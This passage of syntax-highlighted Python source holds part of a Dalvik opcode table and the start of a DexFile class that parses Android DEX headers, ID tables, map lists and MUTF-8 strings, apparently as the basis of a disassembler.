class="number">0xa1</span>: (<span class="string">&quot;or-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa2</span>: (<span class="string">&quot;xor-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa3</span>: (<span class="string">&quot;shl-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa4</span>: (<span class="string">&quot;shr-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa5</span>: (<span class="string">&quot;ushr-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xa6</span>: (<span class="string">&quot;add-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa7</span>: (<span class="string">&quot;sub-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa8</span>: (<span class="string">&quot;mul-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa9</span>: (<span class="string">&quot;div-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xaa</span>: (<span class="string">&quot;rem-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xab</span>: (<span class="string">&quot;add-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xac</span>: (<span class="string">&quot;sub-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xad</span>: (<span class="string">&quot;mul-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xae</span>: (<span class="string">&quot;div-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xaf</span>: (<span class="string">&quot;rem-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xb0</span>: (<span class="string">&quot;add-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb1</span>: (<span class="string">&quot;sub-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb2</span>: (<span class="string">&quot;mul-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb3</span>: (<span class="string">&quot;div-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb4</span>: (<span class="string">&quot;rem-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb5</span>: (<span class="string">&quot;and-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb6</span>: (<span class="string">&quot;or-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb7</span>: (<span class="string">&quot;xor-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb8</span>: (<span class="string">&quot;shl-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb9</span>: (<span class="string">&quot;shr-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xba</span>: (<span class="string">&quot;ushr-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xbb</span>: (<span class="string">&quot;add-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbc</span>: (<span class="string">&quot;sub-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbd</span>: (<span class="string">&quot;mul-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbe</span>: (<span class="string">&quot;div-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbf</span>: (<span class="string">&quot;rem-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc0</span>: (<span class="string">&quot;and-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc1</span>: (<span class="string">&quot;or-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc2</span>: (<span class="string">&quot;xor-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc3</span>: (<span class="string">&quot;shl-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc4</span>: (<span class="string">&quot;shr-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc5</span>: (<span class="string">&quot;ushr-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xc6</span>: (<span class="string">&quot;add-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc7</span>: (<span class="string">&quot;sub-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc8</span>: (<span class="string">&quot;mul-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc9</span>: (<span class="string">&quot;div-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xca</span>: (<span class="string">&quot;rem-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xcb</span>: (<span class="string">&quot;add-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcc</span>: (<span class="string">&quot;sub-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcd</span>: (<span class="string">&quot;mul-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xce</span>: (<span class="string">&quot;div-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcf</span>: (<span class="string">&quot;rem-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xd0</span>: (<span class="string">&quot;add-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd1</span>: (<span class="string">&quot;rsub-int&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd2</span>: (<span class="string">&quot;mul-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd3</span>: (<span class="string">&quot;div-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd4</span>: (<span class="string">&quot;rem-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd5</span>: (<span class="string">&quot;and-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd6</span>: (<span class="string">&quot;or-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd7</span>: (<span class="string">&quot;xor-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xd8</span>: (<span class="string">&quot;add-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd9</span>: (<span class="string">&quot;rsub-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xda</span>: (<span class="string">&quot;mul-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdb</span>: (<span class="string">&quot;div-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdc</span>: (<span class="string">&quot;rem-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdd</span>: (<span class="string">&quot;and-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xde</span>: (<span class="string">&quot;or-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdf</span>: (<span class="string">&quot;xor-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe0</span>: (<span class="string">&quot;shl-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe1</span>: (<span class="string">&quot;shr-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe2</span>: (<span class="string">&quot;ushr-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x0100</span>: (<span class="string">&quot;packed-switch-payload&quot;</span>, <span class="string">&quot;pswitch-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0200</span>: (<span class="string">&quot;sparse-switch-payload&quot;</span>, <span class="string">&quot;sswitch-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0300</span>: (<span class="string">&quot;array-payload&quot;</span>, <span class="string">&quot;array-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xfa</span>: (<span class="string">&quot;invoke-polymorphic&quot;</span>, <span class="string">&quot;45cc&quot;</span>, <span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">    <span class="number">0xfb</span>: (<span class="string">&quot;invoke-polymorphic/range&quot;</span>, <span class="string">&quot;4rcc&quot;</span>, <span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">    <span class="number">0xfc</span>: (<span class="string">&quot;invoke-custom&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">5</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xfd</span>: (<span class="string">&quot;invoke-custom/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">5</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xfe</span>: (<span class="string">&quot;const-method-handle&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">6</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xff</span>: (<span class="string">&quot;const-method-type&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">4</span>, <span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_name</span>(<span class="params">r: <span class="built_in">int</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    locals_size = <span class="built_in">max</span>(<span class="number">0</span>, regs_size - ins_size)</span><br><span class="line">    <span class="keyword">if</span> r &gt;= locals_size:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;p<span class="subst">&#123;r - locals_size&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;v<span class="subst">&#123;r&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ref_kind_name</span>(<span class="params">kind: <span class="type">Optional</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> kind <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ref&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&quot;type&quot;</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="string">&quot;method&quot;</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="string">&quot;proto&quot;</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="string">&quot;call_site&quot;</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="string">&quot;method_handle&quot;</span>,</span><br><span class="line">    &#125;.get(kind, <span class="string">&quot;ref&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DexFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.data: <span class="built_in">bytes</span> = f.read()</span><br><span class="line">        <span class="variable language_">self</span>.size = <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br><span class="line">        <span class="variable language_">self</span>._parse_header()</span><br><span class="line">        <span class="variable language_">self</span>._parse_primary_tables()</span><br><span class="line">        <span class="variable language_">self</span>._parse_map_list()</span><br><span class="line">        <span class="variable language_">self</span>._mh_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._mh_off = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._cs_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._cs_off = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_items.get(<span class="number">0x0008</span>):  <span class="comment"># TYPE_METHOD_HANDLE_ITEM</span></span><br><span class="line">            <span class="variable language_">self</span>._mh_count, <span class="variable language_">self</span>._mh_off = <span class="variable language_">self</span>.map_items[<span class="number">0x0008</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_items.get(<span class="number">0x0007</span>):  <span class="comment"># TYPE_CALL_SITE_ID_ITEM</span></span><br><span class="line">            <span class="variable language_">self</span>._cs_count, <span class="variable language_">self</span>._cs_off = <span class="variable language_">self</span>.map_items[<span class="number">0x0007</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u1</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[off]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u2</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="variable language_">self</span>.data, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u4</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="variable language_">self</span>.data, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_bytes</span>(<span class="params">self, off: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[off:off + n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_header</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.size &lt; <span class="number">0x70</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;DEX 文件过小&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.magic = <span class="variable language_">self</span>._<span class="built_in">bytes</span>(<span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line">        <span class="variable language_">self</span>.file_size = <span class="variable language_">self</span>._u4(<span class="number">0x20</span>)</span><br><span class="line">        <span class="variable language_">self</span>.header_size = <span class="variable language_">self</span>._u4(<span class="number">0x24</span>)</span><br><span class="line">        <span class="variable language_">self</span>.endian_tag = <span class="variable language_">self</span>._u4(<span class="number">0x28</span>)</span><br><span class="line">        <span class="variable language_">self</span>.map_off = <span class="variable language_">self</span>._u4(<span class="number">0x34</span>)</span><br><span class="line">        <span class="variable language_">self</span>.string_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x38</span>)</span><br><span class="line">        <span class="variable language_">self</span>.string_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x3C</span>)</span><br><span class="line">        <span class="variable language_">self</span>.type_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x40</span>)</span><br><span class="line">        <span class="variable language_">self</span>.type_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x44</span>)</span><br><span class="line">        <span class="variable language_">self</span>.proto_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x48</span>)</span><br><span class="line">        <span class="variable language_">self</span>.proto_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x4C</span>)</span><br><span class="line">        <span class="variable language_">self</span>.field_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x50</span>)</span><br><span class="line">        <span class="variable language_">self</span>.field_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x54</span>)</span><br><span class="line">        <span class="variable language_">self</span>.method_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x58</span>)</span><br><span class="line">        <span class="variable language_">self</span>.method_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x5C</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_primary_tables</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._string_offs: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.string_ids_size):</span><br><span class="line">            <span class="variable language_">self</span>._string_offs.append(<span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.string_ids_off + i * <span class="number">4</span>))</span><br><span class="line">        <span class="variable language_">self</span>._string_cache: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._type_str_idx: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.type_ids_size):</span><br><span class="line">            <span class="variable language_">self</span>._type_str_idx.append(<span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.type_ids_off + i * <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._proto_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.proto_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.proto_ids_off + i * <span class="number">12</span></span><br><span class="line">            shorty_idx = <span class="variable language_">self</span>._u4(off + <span class="number">0</span>)</span><br><span class="line">            return_type_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            parameters_off = <span class="variable language_">self</span>._u4(off + <span class="number">8</span>)</span><br><span class="line">            <span class="variable language_">self</span>._proto_list.append((shorty_idx, return_type_idx, parameters_off))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._field_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.field_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.field_ids_off + i * <span class="number">8</span></span><br><span class="line">            class_idx = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            type_idx = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            name_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            <span class="variable language_">self</span>._field_list.append((class_idx, type_idx, name_idx))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._method_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.method_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.method_ids_off + i * <span class="number">8</span></span><br><span class="line">            class_idx = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            proto_idx = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            name_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            <span class="variable language_">self</span>._method_list.append((class_idx, proto_idx, name_idx))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_map_list</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.map_items: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]] = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_off == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        size = <span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.map_off)</span><br><span class="line">        off = <span class="variable language_">self</span>.map_off + <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            <span class="keyword">if</span> off + <span class="number">12</span> &gt; <span class="variable language_">self</span>.size:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            typ = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            _unused = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            count = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            item_off = <span class="variable language_">self</span>._u4(off + <span class="number">8</span>)</span><br><span class="line">            <span class="variable language_">self</span>.map_items[typ] = (count, item_off)</span><br><span class="line">            off += <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_uleb128</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        shift = <span class="number">0</span></span><br><span class="line">        pos = off</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            b = <span class="variable language_">self</span>._u1(pos)</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            result |= (b &amp; <span class="number">0x7F</span>) &lt;&lt; shift</span><br><span class="line">            <span class="keyword">if</span> (b &amp; <span class="number">0x80</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            shift += <span class="number">7</span></span><br><span class="line">        <span class="keyword">return</span> result, pos</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_read_mutf8_at</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]:</span><br><span class="line">        _, pos = <span class="variable language_">self</span>._uleb128(off)</span><br><span class="line">        chars: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            b0 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> b0 == <span class="number">0x00</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> b0 &lt; <span class="number">0x80</span>:</span><br><span class="line">                chars.append(<span class="built_in">chr</span>(b0))</span><br><span class="line">            <span class="keyword">elif</span> (b0 &amp; <span class="number">0xE0</span>) == <span class="number">0xC0</span>:</span><br><span class="line">                b1 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                code = ((b0 &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">6</span>) | (b1 &amp; <span class="number">0x3F</span>)</span><br><span class="line">                <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">                    chars.append(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b1 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                b2 = <span class="variable language_">self</span>._u1(pos + <span class="number">1</span>);</span><br><span class="line">                pos += <span class="number">2</span></span><br><span class="line">                code = ((b0 &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">12</span>) | ((b1 &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (b2 &amp; <span class="number">0x3F</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0xD800</span> &lt;= code &lt;= <span class="number">0xDBFF</span>:</span><br><span class="line">                    b0n = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                    b1n = <span class="variable language_">self</span>._u1(pos + <span class="number">1</span>);</span><br><span class="line">                    b2n = <span class="variable language_">self</span>._u1(pos + <span class="number">2</span>);</span><br><span class="line">                    pos += <span class="number">3</span></span><br><span 